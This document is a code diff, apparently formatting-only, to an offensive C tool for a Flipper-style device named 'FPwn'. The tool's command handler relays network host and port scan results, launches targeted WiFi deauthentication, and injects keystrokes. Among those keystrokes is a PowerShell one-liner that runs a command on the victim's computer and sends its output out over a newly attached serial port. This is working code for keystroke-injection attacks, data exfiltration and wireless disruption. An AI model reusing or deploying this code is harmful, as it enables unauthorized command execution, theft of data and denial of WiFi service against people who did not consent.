@@ -1659,7 +1659,8 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
                 memcpy(ssid, args + 1, ssid_len);
                 ssid[ssid_len] = '\0';
                 pw_start = close_quote + 1;
-                while(*pw_start == ' ') pw_start++;
+                while(*pw_start == ' ')
+                    pw_start++;
             } else {
                 strncpy(ssid, args + 1, sizeof(ssid) - 1);
                 ssid[sizeof(ssid) - 1] = '\0';
@@ -1751,8 +1752,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         uint8_t host_idx = 0;
         FPwnNetHost* hosts = malloc(FPWN_MAX_HOSTS * sizeof(FPwnNetHost));
         if(hosts) {
-            uint32_t host_count =
-                fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
+            uint32_t host_count = fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
             for(uint32_t i = 0; i < host_count; i++) {
                 if(strcmp(hosts[i].ip, target) == 0) {
                     host_idx = (uint8_t)i;
@@ -1800,8 +1800,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         /* Type host results */
         FPwnNetHost* hosts = malloc(FPWN_MAX_HOSTS * sizeof(FPwnNetHost));
         if(hosts) {
-            uint32_t host_count =
-                fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
+            uint32_t host_count = fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
             for(uint32_t i = 0; i < host_count; i++) {
                 if(!hosts[i].alive) continue;
                 char buf[32];
@@ -1816,17 +1815,12 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         /* Type port results */
         FPwnPortResult* ports = malloc(FPWN_MAX_PORTS * sizeof(FPwnPortResult));
         if(ports) {
-            uint32_t port_count =
-                fpwn_marauder_copy_ports(app->marauder, ports, FPWN_MAX_PORTS);
+            uint32_t port_count = fpwn_marauder_copy_ports(app->marauder, ports, FPWN_MAX_PORTS);
             for(uint32_t i = 0; i < port_count; i++) {
                 if(!ports[i].open) continue;
                 char buf[48];
                 snprintf(
-                    buf,
-                    sizeof(buf),
-                    "%u/tcp open %s",
-                    (unsigned)ports[i].port,
-                    ports[i].service);
+                    buf, sizeof(buf), "%u/tcp open %s", (unsigned)ports[i].port, ports[i].service);
                 fpwn_type_string(buf);
                 furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
                 furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
@@ -1865,8 +1859,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
                 if(strcmp(aps[i].ssid, target_ssid) == 0) {
                     free(aps);
                     fpwn_marauder_deauth_targeted(app->marauder, (uint8_t)i);
-                    FURI_LOG_I(
-                        TAG, "Deauth target: %s (idx %lu)", target_ssid, (unsigned long)i);
+                    FURI_LOG_I(TAG, "Deauth target: %s (idx %lu)", target_ssid, (unsigned long)i);
                     return;
                 }
             }
@@ -2218,16 +2211,17 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             fpwn_type_string("$_t=[IO.Ports.SerialPort]; "
                              "$_d=(");
             fpwn_type_string(cmd);
-            fpwn_type_string(")|Out-String; "
-                             "$_p=$_t::GetPortNames()|?{$_ -match '^COM\\d+$'}; "
-                             "1..40|%{sleep -m 500; "
-                             "$_n=$_t::GetPortNames()|?{$_ -match '^COM\\d+$' -and $_ -notin $_p}; "
-                             "if($_n){"
-                             "$_s=$_t::new($_n[0],115200); "
-                             "$_s.Open(); "
-                             "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes($_d+[char]4); "
-                             "$_s.Write($_b,0,$_b.Length); "
-                             "$_s.Close(); break}}");
+            fpwn_type_string(
+                ")|Out-String; "
+                "$_p=$_t::GetPortNames()|?{$_ -match '^COM\\d+$'}; "
+                "1..40|%{sleep -m 500; "
+                "$_n=$_t::GetPortNames()|?{$_ -match '^COM\\d+$' -and $_ -notin $_p}; "
+                "if($_n){"
+                "$_s=$_t::new($_n[0],115200); "
+                "$_s.Open(); "
+                "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes($_d+[char]4); "
+                "$_s.Write($_b,0,$_b.Length); "
+                "$_s.Close(); break}}");
         } else if(os == FPwnOSLinux) {
             /* Bash: capture output, snapshot /dev/ttyACM*, poll for new device,
              * configure with stty, write data + EOT. */
